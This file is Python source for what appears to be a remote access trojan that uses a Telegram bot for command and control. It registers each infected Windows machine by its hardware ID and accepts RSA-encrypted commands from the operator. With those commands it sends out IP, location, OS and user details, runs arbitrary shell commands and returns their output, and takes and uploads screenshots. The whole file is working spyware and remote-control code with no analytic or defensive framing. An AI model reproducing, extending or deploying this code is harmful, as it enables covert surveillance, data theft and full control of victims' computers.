import requests
import asyncio
import subprocess
import io
import base64
import ctypes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

from telegram import Update
from telegram.ext import CallbackContext, MessageHandler, Application, filters

from PIL import ImageGrab

telegram_token = ''
telegram_channel_id = ''
telegram_chat_id = ''

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()

def decrypt_message(encrypted_message):
    encrypted_bytes = base64.b64decode(encrypted_message)
    return private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ).decode('utf-8')

def split_into_chunks(text, chunk_size):
    return [text[i:i + chunk_size] for i in range(0, len(text), chunk_size)]

async def send_hwid(application: Application):
    global hwid
    stripped_public_key_pem = public_key_pem.strip().replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "").replace("\n", "")
    message = f'★{hwid}:{stripped_public_key_pem}'
    await application.bot.send_message(chat_id=telegram_channel_id, text=message)

async def process_channel_post(update: Update, context: CallbackContext):
    global hwid
    if update.channel_post:
        message_text = update.channel_post.text
        if message_text.startswith(f'{hwid}:'):
            parts = message_text.split(':')
            encrypted_command = parts[1].strip().encode('utf-8')
            command = decrypt_message(encrypted_command)
            command_hex = command[:2]
            args = command[2:]

            if command_hex == '00':
                response = requests.get('https://ipwhois.app/json/', timeout=3)
                data = response.json()
                public_ipv4 = data["ip"]
                geolocation = data["country"]
                os_info = subprocess.check_output("powershell Get-CimInstance Win32_OperatingSystem | Select-Object -Property Caption, Version, OSArchitecture, LastBootUpTime | Format-Table -HideTableHeaders").decode().strip()
                whoami_info = subprocess.check_output("whoami").decode().strip()

                info_string = (f"« {hwid} »\n\n"
                            f"IP Address: {public_ipv4}\n"
                            f"Location: {geolocation}\n"
                            f"Operating System Info:\n{os_info}\n"
                            f"Whoami Info:\n{whoami_info}\n\n")

                await context.bot.send_message(chat_id=telegram_chat_id, text=f"```\n{info_string}\n```", parse_mode='Markdown')
            elif command_hex == '01':
                result = subprocess.check_output(args).decode()
                chunks = split_into_chunks(result, 4096)
                for chunk in chunks:
                    await context.bot.send_message(chat_id=telegram_chat_id, text=f"```\n{chunk}\n```", parse_mode='Markdown')
            elif command_hex == '02':
                screenshot = ImageGrab.grab()
                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='PNG')
                img_byte_arr.seek(0)
                await context.bot.send_photo(chat_id=telegram_chat_id, photo=img_byte_arr)
            elif command_hex == '03':
                message = ' '.join(args)
                ctypes.windll.user32.MessageBoxW(0, message, "Success", 1)


async def main():
    app = Application.builder().token(telegram_token).build()

    app.add_handler(MessageHandler(filters.UpdateType.CHANNEL_POST, process_channel_post))

    await send_hwid(app)

    async with app:
        await app.start()
        await app.updater.start_polling()
        while True:
            await asyncio.sleep(3600)  
        await app.updater.stop()
        await app.stop()

if __name__ == '__main__':
    asyncio.run(main())

